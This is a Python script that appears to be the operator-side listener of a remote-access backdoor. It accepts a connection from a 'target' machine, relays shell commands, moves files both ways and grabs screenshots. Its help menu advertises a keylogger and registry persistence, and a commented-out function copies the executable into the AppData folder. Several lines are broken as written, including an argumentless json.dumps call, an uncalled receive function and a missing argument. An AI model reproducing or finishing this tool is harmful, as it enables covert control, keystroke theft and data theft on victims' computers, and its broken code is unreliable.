import os
import socket
import subprocess
from  termcolor import *
import json
import shutil
import sys



def reliable_recv():
    
    data = ''
    while True: 
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)

        except ValueError:

            continue

def reliable_send(data):

    jsondata = json.dumps()
    target.send(jsondata)

def upload_file(file_name):
    f = open(file_name,'rb')
    target.send(f.read())


def download_file(file_name):
    f = open(file_name,'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)

        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


''' def persist(x1,y1):

    file_location = os.environ['appdata'] + '\\' + y1

    try:

        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call()

    except:

        pass '''


def target_communication(ip):
    count = 0

    #message = target.recv(1024)
    #print(message.decode())
    while True:

        command = input('* Shell~%s: '% str(ip))
        #target.send()
        reliable_send(command)
        if command == 'quit':
            break

        elif command == 'clear':
            os.system('clear')

        elif command[:3] == 'cd ':
            pass  
        # elif command == 'cd': FOR WIN10
            # pass

        elif command[:6] == 'upload':
            upload_file(command[7:])
            #upload image.jpg

        elif command[:8] == 'download':
            download_file(command[9:])


        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count),'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)

                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1


        # elif command[:11] == 'persistence':
        #     reg_name, copy_name = command[:12].split(' ')
        #     persist(reg_name,copy_name)

        elif command == 'help':

            print(colored('''\n
            quit                                --> Quit The Session with The Target
            clear                               --> Cler the Screen
            cd *Directory Name*                 --> Changes Directory on Target System
            upload *File Name*                  --> Upload File to The Target Machine
            download *File Name*                --> Download File from Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That the target Inputted
            keylof_stop                         --> Stop and Self Destruct Keylogger File
            persistence *Regname* *File Name*   --> Create Persistence In Registry
            whoami                              --> Showing User Name
            setxkbmap *Country Code*            --> Chanching Language
            netstat -nr                         --> Kernel Ip Routing Table 
            pwd                                 --> Current Working Directory'''),'green')

        else:

            result = reliable_recv
            print(result)


sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sck.bind(('127.0.0.1',5555))

print(colored('[+] Listening For The Incoming Connections','green'))

sck.listen(5)

target, ip = sck.accept()
print(colored('[+] Target Connected From: '+str(ip),'green'))
target_communication()


